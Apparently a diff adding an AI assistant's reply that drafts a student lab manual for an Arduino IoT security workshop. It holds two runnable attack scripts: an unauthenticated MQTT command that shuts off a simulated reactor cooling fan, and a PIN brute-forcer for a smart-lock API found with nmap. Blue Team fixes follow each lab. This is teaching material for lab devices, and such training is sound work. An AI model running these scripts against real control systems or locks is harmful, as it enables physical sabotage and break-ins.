@@ -1,0 +1,130 @@
+Gemini said
+Here is the updated Student Lab Guide, fully branded for the event. I have formatted it cleanly in Markdown so you can easily copy and paste it into Word, Google Docs, or a Markdown-to-PDF converter.
+
+Student Lab Manual: Arduino IoT Security
+Identifying and Patching Embedded Vulnerabilities
+Event: Arduino Day Philippines 2026
+
+Welcome to the lab environment. Today, you will act as both the attacker (Red Team) and the defender (Blue Team) to understand how vulnerabilities in IoT and OT devices translate to physical consequences.
+
+Prerequisites on your workstation:
+
+Python 3.x installed.
+
+Python libraries: paho-mqtt and requests. (Install via: pip install paho-mqtt requests)
+
+Nmap (Network Mapper) installed.
+
+Lab 1: "The SCADA Meltdown"
+Vulnerability: Unauthenticated MQTT Command Injection
+Target: A simulated industrial Programmable Logic Controller (PLC) managing a reactor cooling fan.
+
+Phase 1: The Attack
+Step 1: Observe Normal Operations
+Your instructor will provide a link to the simulated environment (or point you to the physical hardware at the front of the room). Observe the "Reactor Core Temperature" telemetry and verify the cooling fan is currently ON.
+
+Step 2: Prepare the Exploit
+The target PLC is communicating over an unencrypted, unauthenticated MQTT broker at test.mosquitto.org using the topic appkademiya/scada/reactor/cooling.
+
+On your PC, open a text editor, create a file named scada_exploit.py, and paste the following Python script. This script connects to the broker and injects a spoofed JSON payload.
+
+Python
+import paho.mqtt.client as mqtt
+import time
+import json
+
+BROKER_ADDRESS = "test.mosquitto.org"
+CONTROL_TOPIC = "appkademiya/scada/reactor/cooling"
+
+def on_connect(client, userdata, flags, rc):
+    print(f"[*] Connected to broker with status code {rc}")
+
+print("[!] Initiating SCADA override attack...")
+client = mqtt.Client(client_id="Rogue_Node_007")
+client.on_connect = on_connect
+client.connect(BROKER_ADDRESS, 1883, 60)
+client.loop_start()
+time.sleep(1)
+
+# The malicious payload mimicking legitimate control commands
+malicious_payload = json.dumps({"cmd": "fan_off"})
+
+print(f"[>] Injecting payload into topic: {CONTROL_TOPIC}")
+client.publish(CONTROL_TOPIC, malicious_payload)
+
+print("[+] Payload delivered. Cooling system offline.")
+time.sleep(2)
+client.loop_stop()
+client.disconnect()
+Step 3: Execute the Meltdown
+Open your terminal or command prompt, navigate to where you saved the file, and run the attack:
+python scada_exploit.py
+
+Step 4: Verify the Impact
+Look back at the target environment. You should immediately see the cooling fan shut down and the reactor temperature begin to climb rapidly. You have successfully compromised the physical environment via network messaging.
+
+Phase 2: Blue Team Mitigation
+Why did this happen? The broker required no username or password, and the Arduino was programmed to blindly trust any message arriving on the control_topic.
+
+The Fix: To patch this, the Arduino firmware must be updated to use client.connect("SCADA_PLC", "secure_username", "strong_password") and the broker must be configured to reject unauthenticated clients.
+
+Lab 2: "The Phantom Key"
+Vulnerability: Insecure API & Hardcoded Credentials
+Target: A Smart Perimeter Door Lock running a local web server.
+
+Phase 1: Reconnaissance
+Step 1: Network Discovery (Find the Target)
+You are connected to the lab network, but you do not know the IP address of the Smart Lock. Open your terminal and use Nmap to scan your local subnet for devices with an open web server (Port 80).
+
+Command: nmap -p 80 --open 192.168.1.0/24 (Note: Ask your instructor for the exact subnet IP range if different).
+
+Action: Identify the target IP address from the Nmap results.
+
+Step 2: Application Discovery (Find the Vulnerability)
+Open your web browser and navigate to http://<TARGET_IP>. You will see an "Under Construction" page.
+
+Right-click on the page and select "View Page Source".
+
+Look closely at the HTML code. Locate the developer comment (``) that accidentally reveals the hidden /api/unlock?pin=XXXX endpoint structure.
+
+Phase 2: The Attack
+Step 1: Prepare the Brute-Force Exploit
+Create a new file named phantom_key.py and paste the code below. Make sure to update the TARGET_IP variable with the address you found in Phase 1.
+
+Python
+import requests
+import sys
+
+# UPDATE THIS IP ADDRESS BASED ON YOUR NMAP SCAN
+TARGET_IP = "192.168.1.100" 
+TARGET_URL = f"http://{TARGET_IP}/api/unlock"
+
+print(f"[*] Initiating brute-force attack on {TARGET_URL}")
+
+# Iterate through all 10,000 possible 4-digit combinations
+for i in range(10000):
+    pin_guess = f"{i:04d}" # Formats as 0000, 0001, etc.
+    
+    try:
+        response = requests.get(f"{TARGET_URL}?pin={pin_guess}", timeout=2)
+        sys.stdout.write(f"\r[>] Trying PIN: {pin_guess} | Status: {response.status_code}")
+        sys.stdout.flush()
+        
+        if response.status_code == 200 and "SUCCESS" in response.text:
+            print(f"\n\n[+] BINGO! Valid PIN found: {pin_guess}")
+            print(f"[+] Server Response: {response.text.strip()}")
+            break
+            
+    except requests.exceptions.RequestException:
+        print("\n[-] Connection error. Check the IP address.")
+        break
+Step 2: Breach the Perimeter
+Run the script: python phantom_key.py.
+Watch as the script rapidly fires HTTP requests at the device. Once it hits the correct hardcoded PIN, the physical lock mechanism will disengage.
+
+Phase 3: Blue Team Mitigation
+Why did this happen? The developers hardcoded the PIN (7392) directly in the firmware in plaintext, and the web server allowed unlimited, rapid guesses.
+
+The Fix: The instructor will now flash the "Version 2.0" firmware to the lock. This new code stores only a cryptographic hash of the PIN and implements Rate Limiting.
+
+The Test: Try running your phantom_key.py script again. On your 4th guess, you will receive an HTTP 429 Too Many Requests error, and your script will be blocked.
